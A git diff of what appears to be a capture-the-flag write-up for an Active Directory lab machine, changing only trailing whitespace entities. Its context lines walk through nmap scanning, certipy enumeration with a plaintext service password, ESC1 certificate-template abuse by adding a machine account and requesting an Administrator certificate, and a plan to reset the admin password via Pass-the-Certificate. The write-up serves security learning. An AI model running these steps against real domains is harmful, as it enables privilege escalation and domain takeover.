@@ -43,7 +43,7 @@ PORT      STATE    SERVICE
 64054/tcp open     unknown
 ```
 
-This looks like an AD machine. Did a detailed scan to fully enumerate everything.&#x20;
+This looks like an AD machine. Did a detailed scan to fully enumerate everything.
 
 ```
 $ sudo nmap -p 53,80,88,135,139,389,445,8443 -sC -sV --min-rate 3000 10.129.9.12
@@ -71,7 +71,7 @@ PORT     STATE SERVICE       VERSION
 8443/tcp open  ssl/https-alt
 ```
 
-We can add all the domain names into our `/etc/hosts` file.&#x20;
+We can add all the domain names into our `/etc/hosts` file.
 
 ### SMB Shares -> Ansible Creds
 
@@ -238,7 +238,7 @@ Thumbprint                                Subject
 42A80DC79DD9CE76D032080B2F8B172BC29B0182  CN=AUTHORITY-CA, DC=authority, DC=htb
 ```
 
-This sort of guided me towards exploiting vulnerable certificate templates. I used `certipy` to find the CA stuff.&#x20;
+This sort of guided me towards exploiting vulnerable certificate templates. I used `certipy` to find the CA stuff.
 
 ```
 $ certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.9.12
@@ -309,7 +309,7 @@ Then, I looked through the certificates to see if there were any vulnerabilities
       ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
 ```
 
-The `svc_ldap` user can add new computers (most of the time Domain Users can do this), thus allowing us to request for the certificate needed.&#x20;
+The `svc_ldap` user can add new computers (most of the time Domain Users can do this), thus allowing us to request for the certificate needed.
 
 First, add the new computer:
 
@@ -320,7 +320,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Successfully added machine account Evil$ with password Password@123.
 ```
 
-Then, use this to request for the template.&#x20;
+Then, use this to request for the template.
 
 ```
 $ certipy req -u 'Evil$' -p 'Password@123' -dc-ip 10.129.9.12 -ca AUTHORITY-CA -template CorpVPN -upn Administrator -debug
@@ -337,7 +337,7 @@ Certipy v4.4.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-We are unable to request for a TGT using this certificate however.&#x20;
+We are unable to request for a TGT using this certificate however.
 
 ```
 $ certipy auth -pfx 'administrator.pfx' -username administrator -domain authority.htb -dc-ip 10.129.9.12 
@@ -348,7 +348,7 @@ Certipy v4.4.0 - by Oliver Lyak (ly4k)
 [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
 ```
 
-This means that Rubeus would fail as well. In this case, let's try to Pass the Certificate to reset the administrator's password.&#x20;
+This means that Rubeus would fail as well. In this case, let's try to Pass the Certificate to reset the administrator's password.
 
 {% embed url="https://github.com/AlmondOffSec/PassTheCert" %}
 
